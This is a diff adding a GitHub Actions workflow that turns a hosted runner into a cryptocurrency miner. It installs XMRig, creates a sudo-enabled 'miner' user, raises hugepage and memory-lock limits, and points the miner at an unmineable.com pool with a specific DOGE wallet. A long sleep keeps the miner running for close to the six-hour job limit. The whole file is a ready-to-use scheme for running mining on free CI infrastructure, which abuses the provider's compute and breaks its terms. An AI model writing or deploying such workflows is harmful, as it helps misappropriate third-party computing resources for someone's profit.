@@ -1,0 +1,121 @@
+name: LINUX_MINING_DOGE
+
+on:
+  workflow_dispatch:
+
+jobs:
+  linux-mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+      # =====================
+      # UPDATE SYSTEM
+      # =====================
+      - name: Update system
+        run: |
+          sudo apt update -y
+          sudo apt upgrade -y
+
+      # =====================
+      # BASIC TOOLS
+      # =====================
+      - name: Install basic tools
+        run: |
+          sudo apt install -y \
+            curl wget unzip htop screen \
+            cpufrequtils \
+            linux-tools-common linux-tools-generic \
+            libjemalloc2
+
+      # =====================
+      # CREATE USER
+      # =====================
+      - name: Create Mining User
+        run: |
+          sudo useradd -m -s /bin/bash miner || true
+          sudo usermod -aG sudo miner
+
+      # =====================
+      # SYSTEM BOOST (SAFE)
+      # =====================
+      - name: System Boost for RandomX
+        run: |
+          echo 128 | sudo tee /proc/sys/vm/nr_hugepages
+          echo "vm.nr_hugepages=128" | sudo tee /etc/sysctl.d/99-hugepages.conf
+          sudo sysctl -p /etc/sysctl.d/99-hugepages.conf
+
+          echo "* soft memlock unlimited" | sudo tee -a /etc/security/limits.conf
+          echo "* hard memlock unlimited" | sudo tee -a /etc/security/limits.conf
+
+          sudo cpufreq-set -g performance || true
+          sudo swapoff -a || true
+
+      # =====================
+      # INSTALL XMRIG (STATIC)
+      # =====================
+      - name: Install XMRig
+        run: |
+          sudo -u miner bash << 'EOF'
+          set -e
+          cd /home/miner
+
+          wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+
+          mv xmrig-6.22.2 xmrig
+          chmod +x xmrig/xmrig
+          EOF
+
+      # =====================
+      # CONFIG XMRIG
+      # =====================
+      - name: Configure XMRig for DOGE
+        run: |
+          sudo -u miner bash << 'EOF'
+          cat > /home/miner/xmrig/config.json << 'JSON'
+          {
+            "autosave": true,
+            "background": false,
+            "colors": true,
+            "cpu": {
+              "enabled": true,
+              "huge-pages": true,
+              "huge-pages-jit": true,
+              "max-threads-hint": 80,
+              "priority": 3,
+              "asm": true
+            },
+            "randomx": {
+              "1gb-pages": false,
+              "numa": false
+            },
+            "pools": [
+              {
+                "url": "rx.unmineable.com:3333",
+                "user": "DOGE:DSKETmx7cUo8xmXSXQL4ZwzddSmAuuU5w3.9",
+                "pass": "x",
+                "keepalive": true,
+                "tls": false
+              }
+            ]
+          }
+          JSON
+          EOF
+
+      # =====================
+      # START MINING
+      # =====================
+      - name: Start Mining DOGE
+        run: |
+          cd /home/miner/xmrig
+          sudo -u miner ./xmrig --donate-level=0 &
+          
+          echo "======================================"
+          echo "MINER: XMRig → Unmineable → DOGE"
+          echo "WALLET: DSKETmx7cUo8xmXSXQL4ZwzddSmAuuU5w3"
+          echo "WORKER: 9"
+          echo "======================================"
+          
+          # Keep alive selama 6 jam (limit GitHub Actions)
+          sleep 21000
